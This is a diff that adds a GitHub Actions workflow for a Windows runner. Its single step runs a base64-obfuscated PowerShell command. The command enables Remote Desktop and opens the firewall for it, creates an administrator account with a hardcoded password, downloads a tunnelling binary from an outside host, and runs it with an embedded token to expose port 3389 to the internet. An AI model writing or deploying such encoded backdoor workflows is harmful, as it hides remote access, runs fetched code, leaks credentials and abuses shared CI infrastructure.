@@ -1,0 +1,14 @@
+name: Windows 2022 Access
+
+on:
+  workflow_dispatch:
+
+jobs:
+  win-access:
+    runs-on: windows-2022
+    timeout-minutes: 360   # Max runtime 6 hours
+
+    steps:
+      - name: Setup System and Tunnel
+        run: |
+          powershell -EncodedCommand U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyIiAtTmFtZSAiZkRlbnlUU0Nvbm5lY3Rpb25zIiAtVmFsdWUgMDsgRW5hYmxlLU5ldEZpcmV3YWxsUnVsZSAtRGlzcGxheUdyb3VwICJSZW1vdGUgRGVza3RvcCI7IFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlclxXaW5TdGF0aW9uc1xSRFAtVGNwIiAtTmFtZSAiVXNlckF1dGhlbnRpY2F0aW9uIiAtVmFsdWUgMTsgbmV0IHVzZXIgYWRtaW5pc3RyYXRvciBPTERVU0VSIzYgL2FkZDsgbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgYWRtaW5pc3RyYXRvciAvYWRkOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwczovL3MzLmFwLXNvdXRoLTEuYW1hem9uYXdzLmNvbS9wdWJsaWMucGluZ2d5LmJpbmFyaWVzL2NsaS92MC4yLjUvd2luZG93cy9hbWQ2NC9waW5nZ3kuZXhlIiAtT3V0RmlsZSAicGluZ2d5LmV4ZSI7IC5ccGluZ2d5LmV4ZSAtLXRva2VuIEs0cmROTFpUUWU5IC0tdHlwZSB0Y3AgLWwgMzM4OQo=
